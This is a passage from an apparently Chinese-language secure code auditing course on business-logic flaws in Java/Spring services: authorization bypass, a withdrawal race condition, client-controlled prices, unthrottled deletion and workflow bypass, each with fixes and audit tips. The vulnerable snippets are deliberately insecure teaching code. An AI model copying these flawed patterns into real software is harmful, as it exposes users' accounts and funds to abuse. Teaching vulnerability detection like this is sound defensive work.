    public Order getOrder(@PathVariable Long orderId, @AuthenticationPrincipal User user) {
        Order order = orderRepository.findById(orderId);
        if (!order.getUserId().equals(user.getId())) {
            throw new AccessDeniedException("这不是你的订单");
        }
        return order;
    }
  审计方法：搜索所有 findById / getById / findByXxx，检查调用前有没有做权限校验

类型2：竞态条件（Race Condition）
  现象：用户同时发起10个"提现"请求，每个都通过了余额检查，最终提走了10倍余额
  代码特征：
    if (balance >= withdrawAmount) {  // ← 检查余额
        balance -= withdrawAmount;     // ← 扣款
        transfer(amount);              // ← 转账
    }  // 问题：检查和扣款之间有时间窗口！并发请求可能全部通过检查！
  修复：数据库行锁或乐观锁
    UPDATE accounts SET balance = balance - ? 
    WHERE user_id = ? AND balance >= ?
    // ← 一条SQL原子操作，不会有竞态窗口
  审计方法：搜索"if (xxx >= xxx)" + "xxx -= xxx" 或 "setBalance()" 组合

类型3：参数篡改——价格/数量/角色在客户端可控
  现象：前端提交 { "productId": 123, "price": 1, "quantity": 1 } → 攻击者把price改成0.01
  代码特征：
    @PostMapping("/api/order")
    public Order createOrder(@RequestBody OrderRequest req) {
        // 直接用了前端传来的价格！
        order.setTotal(req.getPrice() * req.getQuantity());
        // ← 攻击者可以传任何价格！
    }
  修复：价格从服务器端获取，不信任客户端传入
    Product product = productRepository.findById(req.getProductId());
    order.setTotal(product.getPrice() * req.getQuantity());
  审计方法：搜索Controller中直接使用request.getParameter()/getBody()中的金额字段

类型4：批量操作未限制——一次操作100万条数据
  现象：删除接口 /api/deleteUser?id=1 → 攻击者改成 /api/deleteAll 或循环调用
  代码特征：
    @DeleteMapping("/api/users/{id}")
    public void deleteUser(@PathVariable Long id) {
        userRepository.deleteById(id);  // ← 没有频率限制！攻击者可以1秒内删除所有用户
    }
  修复：添加频率限制+操作审计
    → API网关层：同一用户1分钟内最多5次DELETE操作
    → 应用层：删除操作记录审计日志+高危操作需要二次确认

类型5：工作流绕过——跳过关键审批步骤
  现象：正常流程是 提交→审批→执行，攻击者直接调用了"执行"接口
  代码特征：
    @PostMapping("/api/payment/execute")  // ← 这个接口有做权限校验吗？
    public void executePayment(@RequestBody PaymentRequest req) {
        // 直接执行了！没有检查"这笔支付是否通过了审批流程"
        paymentService.execute(req);
    }
  修复：在每个"动作"接口中校验前置状态
    Payment payment = paymentRepository.findById(req.getPaymentId());
    if (payment.getStatus() != Status.APPROVED) {
        throw new IllegalStateException("支付尚未通过审批");
    }
  审计方法：搜索"execute/perform/submit/approve"接口，检查是否校验了业务状态
```

**业务逻辑漏洞审计的"灵魂三问"：**

```markdown
拿到一个Controller/Action后，问自己三个问题：

① "如果我把URL中的ID改成别人的ID，会发生什么？" → 测越权
② "如果我同时发10个一样的请求，会发生什么？" → 测竞态
③ "如果我跳过第1步直接调第3步的接口，会发生什么？" → 测工作流绕过

这三个问题能帮你发现70%以上的业务逻辑漏洞。
```

---

**📎 下节预告**：Day 22「数据安全——DLP与数据分类分级」，学习如何保护组织最核心的资产——数据。
